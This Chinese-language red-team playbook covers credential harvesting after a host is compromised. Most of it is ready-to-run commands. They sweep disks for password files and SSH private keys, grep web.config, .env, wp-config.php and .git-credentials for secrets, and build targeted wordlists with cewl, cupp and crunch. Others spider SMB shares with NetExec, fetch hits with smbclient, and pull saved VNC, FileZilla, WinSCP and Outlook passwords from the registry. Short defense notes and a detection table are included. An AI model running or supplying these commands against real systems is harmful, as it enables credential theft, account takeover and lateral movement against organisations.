# 密码收集

_内网密码本 / 字典生成 / 配置文件口令 / 共享盘口令文件 全链 payload_

> 定位：攻击侧「密码数据收集」专篇。攻陷单点后，从**站内密码本、配置文件、共享盘**批量收割口令，
> 是横向与提权的前置。全链口径（前置条件 → 命令/工具 → 参数 → 输出解读 → 规避 → 证据要求）。
> 覆盖：①站内密码本（txt/xls/doc/onenote）②字典生成（cewl/cupp/crunch）③配置文件口令批量
> （web.config/application.properties/.env/php config/数据库连接串/SSH config）④共享盘 SMB 口令文件
> ⑤VNC/FTP/邮件客户端配置口令。

---

### 站内密码本搜集  `password-files`
_定位并收割 txt/xls/docx/onenote 等口令文件_
子类：**密码文件** · tags: `password` `files` `credential` `windows` `linux`

**前置条件：**
- 已获得目标主机 shell（用户权限即可，部分目录需更高权限）
- 目标用户有「记密码」习惯（密码本/备忘）

**攻击链：**

**Windows 全盘定位密码文件**
> 按文件名/扩展名定位疑似口令文件
_platform: windows_
```
# 文件名命中「密码/账号/口令/账密」等关键词
dir /s /b C:\Users\*.txt 2>nul | findstr /i "password 密码 账号 口令 passwd 账密"
dir /s /b C:\Users\*.xls* C:\Users\*.doc* C:\Users\*.one 2>nul | findstr /i "password 密码 账号"

# 更精确：定位桌面/文档/下载目录的密码本
for %d in (Desktop Documents Downloads) do dir /s /b "%USERPROFILE%\%d" 2>nul | findstr /i "password passwd 密码 账号 口令"
```
**语法解析：**
- `dir /s /b` — 递归列出文件（只输出完整路径） _command_
- `findstr /i` — 不区分大小写过滤关键字 _command_

**Linux 全盘定位密码文件**
> find 按文件名关键词收割
_platform: linux_
```
find / -type f \( -iname "*password*" -o -iname "*passwd*" -o -iname "*.pem" -o -iname "*.key" \) 2>/dev/null
find /home /root /opt /tmp -type f \( -iname "*密码*" -o -iname "*账号*" \) 2>/dev/null
```
**语法解析：**
- `-iname` — 不区分大小写文件名匹配 _command_
- `2>/dev/null` — 丢弃权限不足告警，避免刷屏 _command_

**内容级搜索（文件名不含关键词但内容含密码）**
> 在文档/配置里 grep 明文口令特征
_platform: linux_
```
grep -rniE "password|passwd|pwd|secret|token" /home /opt /var/www 2>/dev/null \
  --include="*.txt" --include="*.md" --include="*.conf" --include="*.env" | head -100
```

**输出解读**：命中即候选密码本，优先读 `password*.txt` / 桌面 `账密*.xls`；文档类（docx/xls）需先提取文本（`unzip -p x.docx word/document.xml` 或用 LibreOffice headless 转 txt）。

**证据要求**：文件名 + 路径 + 命中关键字 + 掩码后的口令样本（敏感数据最小化：不整本外带）。

**防御措施：** 1) 禁止明文口令落盘 2) 部署 DLP 扫描密码文件 3) 文件访问审计（Windows SACL / Linux auditd）。

---

### 字典生成  `wordlist-gen`
_cewl 爬站 / cupp 社工 / crunch 规则 生成高质量字典_
子类：**字典** · tags: `wordlist` `cewl` `cupp` `crunch`

**前置条件：**
- 攻击机已装 cewl / cupp / crunch（缺则按四级兜底：脚本或安装请求）
- 已掌握目标组织信息（公司名/域名/人名/关键词）

**攻击链：**

**cewl — 爬站提取关键词字典**
> 从目标门户/登录页爬取专有词汇
_platform: linux_
```
cewl http://target.com -d 3 -m 5 -w target-words.txt
cewl http://target.com --with-numbers -d 2 -w target-words-num.txt
```
**语法解析：**
- `-d 3` — 爬取深度 3 层 _parameter_
- `-m 5` — 仅收录长度 ≥5 的词 _parameter_
- `--with-numbers` — 追加数字变体（如 admin2024） _parameter_

**cupp — 社工画像生成个性化字典**
> 交互式按目标个人信息生成
_platform: linux_
```
python3 cupp.py -i
# 交互输入：姓名/昵称/生日/宠物/配偶/公司等 → 生成 <name>.txt
```

**crunch — 规则字典（公司名+年份+特殊字符）**
> 按模式批量生成
_platform: linux_
```
crunch 8 12 -t Corp@@@@% -o corp-pass.txt
crunch 6 12 -p admin 2024 ! -o combo.txt
```
**语法解析：**
- `8 12` — 长度范围 8–12 _parameter_
- `-t Corp@@@@%` — 模式：`@`=小写字母 `%`=数字，生成 Corp+4字母+1数字 _parameter_
- `-p` — 对给定词做全排列组合 _parameter_

**键盘规律/弱口令模板**：另可基于「公司缩写+年份+`@#!`」等手工模板追加（`qwerty`、`1qaz2wsx`、`admin@2024`）。

**输出解读**：字典规模与命中率相关——cewl 词量少但精准，cupp 命中率高，crunch 覆盖面广但需配合 GPU/分布式破解。

**证据要求**：记录字典来源规则与词条数；破解结果（哈希→明文）登记 evidence-index。

**防御措施：** 1) 强制密码策略拒绝公司名/键盘规律 2) 账号锁定策略抗爆破 3) 爆破流量监测。

---

### 配置文件口令批量收集  `config-cred`
_web.config / application.properties / .env / 数据库连接串 / SSH config_
子类：**配置文件** · tags: `config` `web.config` `env` `database` `ssh`

**前置条件：**
- 已获得 Web 服务器/应用主机 shell
- 具备读应用目录权限

**攻击链：**

**Windows/IIS 配置文件**
> web.config connectionString 与 appSettings 口令
_platform: windows_
```
findstr /s /i /m "connectionString password pwd" C:\inetpub\wwwroot\*.config 2>nul
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password user"
```

**Java 应用配置**
> application.properties / yml / 数据源口令
_platform: linux_
```
find / -type f \( -name "application*.properties" -o -name "application*.yml" -o -name "*.yaml" \) 2>/dev/null | xargs grep -iE "password|username|url" 2>/dev/null
```

**通用环境变量文件**
> .env / .git-credentials / php config
_platform: linux_
```
find /var/www /opt /srv /home -type f \( -name ".env" -o -name "config.php" -o -name "wp-config.php" -o -name ".git-credentials" \) 2>/dev/null -exec grep -iE "password|secret|key|token|db_" {} \; 2>/dev/null
```

**SSH / 运维配置**
> SSH config 与证书私钥
_platform: linux_
```
cat ~/.ssh/config 2>/dev/null
find / -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "*.ppk" \) 2>/dev/null
```

**输出解读**：`connectionString`/`spring.datasource.password`/`DB_PASSWORD=` 后的值即数据库口令；`wp-config.php` 的 `DB_PASSWORD` 同理；SSH 私钥可直接用于免密登录（注意 `id_rsa` 权限与是否加密）。

**证据要求**：配置文件路径 + 字段名 + 掩码口令 + 归属服务。

**防御措施：** 1) 配置外置+密钥管理（Vault/KMS）2) 禁止口令硬编码进版本库 3) 部署后清理 .env/.git-credentials。

---

### 共享盘口令文件枚举  `smb-share-creds`
_SMB 共享盘内 password*/账号*/敏感文档 枚举_
子类：**共享盘** · tags: `smb` `share` `password` `netexec`

**前置条件：**
- 域内有效账户（或已窃取账户）
- 域内可路由到目标 SMB 主机

**攻击链：**

**枚举主机共享与权限**
> NetExec 列出可访问共享
_platform: linux_
```
nxc smb 10.10.10.0/24 -u 'user' -p 'pass' --shares
```
**语法解析：**
- `--shares` — 枚举每台主机的共享及当前账号读写权限 _parameter_

**Spider 抓取口令文件**
> 递归爬取共享内密码相关文件
_platform: linux_
```
nxc smb <target> -u 'user' -p 'pass' -M spider \
  -o PATTERN='password,密码,账号,passwd,账密,credentials'
```
**语法解析：**
- `-M spider` — 启用 spider 模块递归枚举文件 _parameter_
- `-o PATTERN=` — 命中文件名/内容关键字，逗号分隔 _parameter_

**命中文件下载**
> 用 smbclient 拉取候选文件
_platform: linux_
```
smbclient //<target>/<share> -U 'user%pass' -c 'get "IT/password.txt" /tmp/p.txt'
```

**输出解读**：spider 命中即候选口令文件（`密码表.xlsx`/`账号.txt`/`服务器账密.docx`）；优先拉取命名含「密码/账号」的文件，其次 `*.xlsx`（运维台账常见）。

**证据要求**：主机 + 共享名 + 命中文件名 + 掩码样本；不整盘外带。

**防御措施：** 1) 共享盘最小权限 2) 敏感文件进受控目录 3) SMB 访问审计 + 异常枚举检测。

---

### VNC / FTP / 邮件客户端配置口令  `client-config-creds`
_提取 VNC、FTP 客户端、邮件客户端保存的口令_
子类：**客户端** · tags: `vnc` `ftp` `mail` `client` `credential`

**前置条件：**
- 目标主机 shell（注册表/配置目录读权限）

**攻击链：**

**VNC 口令（注册表）**
_platform: windows_
```
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
```
> VNC 口令为固定算法加密（RealVNC 可用 vncpwd 类脚本解密），命中后横向到图形终端。

**FTP 客户端（FileZilla/WinSCP）**
_platform: windows_
```
type "%APPDATA%\FileZilla\sitemanager.xml" 2>nul | findstr /i "Host User Pass"
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s 2>nul | findstr /i "UserName Password HostName"
```

**邮件客户端（Outlook/Thunderbird）**
_platform: windows_
```
# Outlook 配置（POP3/SMTP 口令常存注册表或凭据管理器）
reg query "HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles" /s 2>nul | findstr /i "Password"
# Thunderbird（Linux/Windows 通用，NSS 存口令）
find / -type f -name "logins.json" 2>/dev/null
```

**输出解读**：FileZilla `sitemanager.xml` 的 `<Pass>` 为 Base64 编码（非加密，直接 `echo <值> | base64 -d`）；WinSCP 注册表口令用主密钥加密，需配合 master password 或 DPAPI；Thunderbird 走 NSS（见 browser-creds 篇 Firefox 链路）。

**证据要求**：客户端类型 + 配置路径 + 掩码口令 + 目标主机。

**防御措施：** 1) 客户端主密码启用 2) 不保存高价值口令 3) 配置目录 ACL 收紧。

---

## 检测点汇总（本专篇攻击行为 → 目标侧痕迹）

| 攻击行为 | 应留痕迹 |
|---|---|
| 全盘 find/dir 搜密码文件 | 文件系统大量遍历（EDR 文件访问遥测、SACL/auditd 审计） |
| cewl 爬站 | 目标 Web 访问日志高频爬取（单源 IP 多 URL） |
| crunch/cupp 字典 + hashcat 破解 | 爆破流量（若在线）；离线无主机痕迹，靠哈希泄露溯源 |
| 配置文件批量读取 | 应用目录非授权读取、进程访问 `.env`/`web.config` |
| NetExec `--shares`/spider | SMB 日志异常共享枚举、4624 登录类型 3 + 高频 UNC 访问 |
| VNC/客户端配置读取 | 注册表读取（Sysmon Event 13 RegistryEvent） |

## 参考

- ATT&CK T1552（Unsecured Credentials）、T1555（Credentials from Password Stores）
- 工具：cewl / cupp / crunch / NetExec（spider 模块）/ smbclient
